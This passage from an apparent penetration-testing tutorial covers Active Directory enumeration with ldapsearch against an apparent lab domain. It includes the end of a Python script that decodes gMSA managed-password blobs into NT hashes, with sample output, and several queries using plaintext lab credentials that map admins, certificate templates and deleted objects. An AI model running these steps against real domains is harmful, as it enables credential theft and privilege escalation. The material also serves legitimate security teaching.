&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; opt &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;-b&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--base64&amp;#34;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            b64 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; b64 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gmsa.py -b &amp;lt;msDS-ManagedPassword base64&amp;gt; -v (optional verbose)&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(b64)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    blob &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MSDS_MANAGEDPASSWORD_BLOB()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    blob&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromString(test)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; verbose &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        blob&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;dump()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Cleartext Password&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        hexdump(blob[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;][:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Cryptodome.Hash &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; MD4
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hash &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MD4&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new ()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    hash&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;update (blob[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CurrentPassword&amp;#39;&lt;/span&gt;][:&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;NTHash: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(hash&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexdigest()))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   main(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:])
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ python3 ./gmsa.py -b AQAAACQCAAAQABIBFAIcAq/tlcA3PziSdtjxwKwcpM9VAteZa9No6et8yDWzgEYj5yFDhzT0OMFtTA4qAI4M+sWjiUVqYhDwFItW+5FlhaJp8tm/fcAfIDc5MAsYOXgq3AIc6ofCpeJga6Jw4SX/EKmnQdsS7lGmXd/yh27qJGj6SS0vwk//D8cr1+6s43YB0TxUxyLrruupZmd4Ndx2PZ4L4zkWa/vlRlDzadyeGwji70q9sfjH5x7+l7V+w5JK7/hKfG48swD8koEK/bHyLxZa8eDMEoscAmnuC/CA/pTvdF6jfIYmAYMGZujOVkbXJjaCEPGA1+nBDqkOQ1NlLZu4Y6Es1bB3YVIv6agDICYAAJ3USvAd5t267x9PfdetWSfLGRt4qxMCmOwXO0nVWMJTSYfjC+Phc0QX/rrTimPptYvx2NnuAclbgj0Fvg0iZfOvHW0SwdKTyKCvGeL+UPz4Jwr2VAd+PX43GoUPD8uBhDrtzVSwUhtScDIvzGJYgvHrREnTUqaf9pENqkVpbdXHtpE/buIphVrPEg84e9fgNB2a/r6sZaPX+1C8e/5pbNO7qoQ4fqXSDPM3qh6ymlh2ouNRoP0kN4sLVUvW+cNX+YQk7UJDSnG3fANPtgquhi6B4OVqU2fpypUbFtd91Ju/9xZeuod508FqYHPT1aX86tBdLj4yq2/65ROupERLVhAAADPE7gxzEgAAM2YeWnISAAA&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;================================================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NTHash: 78450c9611e6c9515e2a489f9b31cc3e
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;================================================================================&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If you want to learn more about GMSAs and a newer attack called the &amp;ldquo;Golden GMSA&amp;rdquo; check out the Sempris blog here: &lt;a href=&#34;https://www.semperis.com/blog/golden-gmsa-attack/&#34;&gt;https://www.semperis.com/blog/golden-gmsa-attack/&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;certificate-authorities-and-templates&#34;&gt;Certificate Authorities and Templates&lt;/h3&gt;
&lt;p&gt;This is a list of certificate templates that are enabled on each certificate authority in the domain.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -LLL -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; -h 192.168.80.10 -w &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ASDqwe123&amp;#34;&lt;/span&gt; -D &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;uberuser&amp;#34;&lt;/span&gt;  certificateTemplates
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Enrollment Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Public Key Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck-W2KCA-CA,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Enrollment Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Public Key Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;S
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ervices,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: ExchangeUser
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: ExchangeUserSignature
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EnrollmentAgentOffline
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: MachineEnrollmentAgent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EnrollmentAgent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CrossCA
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CodeSigning
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CEPEncryption
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CAExchange
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: ClientAuth
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: Workstation
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: UserSignature
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: CTLSigning
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: SmartcardUser
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: SmartcardLogon
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: OfflineRouter
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: RASAndIASServer
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: OCSPResponseSigning
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: KeyRecoveryAgent
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: IPSECIntermediateOffline
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: IPSECIntermediateOnline
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: DirectoryEmailReplication
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: DomainControllerAuthentication
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: KerberosAuthentication
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EFSRecovery
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: EFS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: DomainController
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: WebServer
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: Machine
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: User
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: SubCA
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;certificateTemplates: Administrator
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;nested-group-membership&#34;&gt;Nested Group Membership&lt;/h3&gt;
&lt;p&gt;A query like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(memberOf=cn=Domain Admins,cn=Users,dc=SittingDuck,dc=info)&amp;#39;&lt;/span&gt; cn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;will result in all of the accounts that have a &lt;code&gt;memberOf&lt;/code&gt; attribute of Domain Admins. This will show you the first level of membership, but LDAP/AD actually has a way to identify nested membership using the &lt;a href=&#34;https://ldapwiki.com/wiki/1.2.840.113556.1.4.1941&#34;&gt;1.2.840.113556.1.4.1941&lt;/a&gt; &lt;a href=&#34;https://ldapwiki.com/wiki/OID&#34;&gt;OID&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,cn=Users,dc=sittingduck,dc=info)&amp;#39;&lt;/span&gt; cn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This will show you all Domain Admins even if they are in a group in a group in a group in a group.&lt;/p&gt;
&lt;h3 id=&#34;find-exchange-servers&#34;&gt;Find Exchange Servers&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -LLL -h 192.168.80.10 -o ldif-wrap&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no -x -D uberuser -w ASDqwe123 -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cn=Configuration,dc=sittingduck,dc=info&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(objectCategory=msExchExchangeServer)&amp;#34;&lt;/span&gt; dn
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;SDEXCHANGE,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Servers,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Exchange Administrative Group &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;FYDIBOHF23SPDLT&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Administrative Groups,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;First Organization,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Microsoft Exchange,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Services,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Configuration,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;deleted--tombstoned-objects&#34;&gt;Deleted / Tombstoned objects&lt;/h3&gt;
&lt;p&gt;Looking at deleted and tombstoned objects won&amp;rsquo;t always get you much information you can directly use, but sometimes there are passwords or other sensitive data stored in objects. (I don&amp;rsquo;t believe deleting objects changes their permissions but I could be wrong here)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ldapsearch -h 192.168.80.10 -x -w ASDqwe123 -D uberuser -b &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;CN=Deleted Objects,DC=sittingduck,DC=info&amp;#34;&lt;/span&gt; -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;!1.2.840.113556.1.4.417&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For example here is a Computer account that was deleted:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# blah1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef, Deleted Objects, sittingduck.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dn: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah1&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Deleted Objects,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: top
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: person
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: organizationalPerson
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: user
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectClass: computer
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cn:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;distinguishedName: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah1&lt;span style=&#34;color:#ae81ff&#34;&gt;\0&lt;/span&gt;ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Dele
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; ted Objects,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;instanceType: &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whenCreated: 20220512041425.0Z
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;whenChanged: 20220512045921.0Z
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uSNCreated: &lt;span style=&#34;color:#ae81ff&#34;&gt;2663983&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isDeleted: TRUE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;uSNChanged: &lt;span style=&#34;color:#ae81ff&#34;&gt;2664044&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;name:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectGUID:: sRl7L+6dSEqLsK1i5qKH7w&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;userAccountControl: &lt;span style=&#34;color:#ae81ff&#34;&gt;4128&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;objectSid:: AQUAAAAAAAUVAAAAfS9vpuKLWG5ZpW7N9RUAAA&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sAMAccountName: BLAH1$
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lastKnownParent: CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;Computers,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;sittingduck,DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;info
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;isRecycled: TRUE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;replication-metadata&#34;&gt;Replication Metadata&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;src: &lt;a href=&#34;https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19&#34;&gt;https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;src: &lt;a href=&#34;https://stackoverflow.com/a/38710484&#34;&gt;https://stackoverflow.com/a/38710484&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is one place where ldapsearch isn&amp;rsquo;t quite as cool as other tools, all of the base64 output. I did &lt;a href=&#34;https://stackoverflow.com/a/38710484&#34;&gt;find a great way to decode most of it&lt;/a&gt; on StackOverflow:&lt;/p&gt;
&lt;ul&gt;
